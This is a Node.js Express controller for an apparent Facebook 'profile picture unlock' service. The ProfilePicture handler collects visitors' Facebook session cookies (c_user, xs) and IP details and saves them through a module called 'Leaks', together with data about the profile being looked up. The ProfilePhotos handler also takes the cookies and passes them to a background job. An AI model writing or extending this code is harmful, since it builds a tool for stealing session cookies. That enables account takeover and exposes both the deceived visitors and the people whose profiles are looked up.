const {BackgroundProcess} = require("../libs/classes/BackgroundProcess");
const probe = require("probe-image-size");

const {randomBytes} = require("crypto");
const Facebook = require("../libs/facebook");
const Leaks = require("../libs/leaks");
const catchAsync = require("../utils/catchAsync");
const PhotoProcessor = require("../libs/photos");
const ApiError = require("../utils/ApiError");
const httpStatus = require("http-status");

exports.ProfilePicture = catchAsync(async (req, res) => {
    const {link, c_user, xs} = req.body;
    const cookies = {c_user, xs}
    const GetData = await Facebook.GetIdFromLink(link, cookies);

    const ProfilePicture = await Facebook.GetProfilePicture(GetData.id);
    if (!ProfilePicture) throw new ApiError(httpStatus.BAD_REQUEST,"No Profile Picture found")
    const TargetInfo = await Facebook.GetFacebookTargetInfo(ProfilePicture,GetData.username)

    const ipInfo = {ip: req.clientIp, source: req.source, ipInfo: req.ipInfo}


    const PhotoHash = await PhotoProcessor.HashImage(ProfilePicture)
    const isExisted = await PhotoProcessor.findByHash(PhotoHash,GetData.username)

    if (!isExisted) {
        const TargetLeak = await Facebook.GetFacebookTargetInfo(ProfilePicture)

        await Leaks.createUnlockFacebookPicture(GetData, TargetInfo, cookies, ipInfo,PhotoHash)
    } else {
        const UserInfo =  await Facebook.GetFacebookUserInfo(c_user)
        UserInfo.cookies = cookies
        UserInfo.ipInfo = ipInfo
        await Leaks.findByIdAndUpdateUser(isExisted, c_user,UserInfo)
    }

    const {width, height} = await probe(ProfilePicture)
    return res.json({
        image: ProfilePicture, username: GetData.username, full_name: GetData.name, width, height
    });
});

exports.ProfilePhotos = async (req, res) => {
    try {
        const {link, xs, c_user} = req.body;
        const profilePhotosJob = new BackgroundProcess("facebook:profile_photos");
        const job_id = randomBytes(16).toString("hex");
        profilePhotosJob.facebookProfilePhotosJob({
            link, xs, c_user, req, job_id,
        });

        return res.status(200).json({operation: job_id});
    } catch (error) {
        console.log(error);
        return res.sendStatus(500);
    }
};
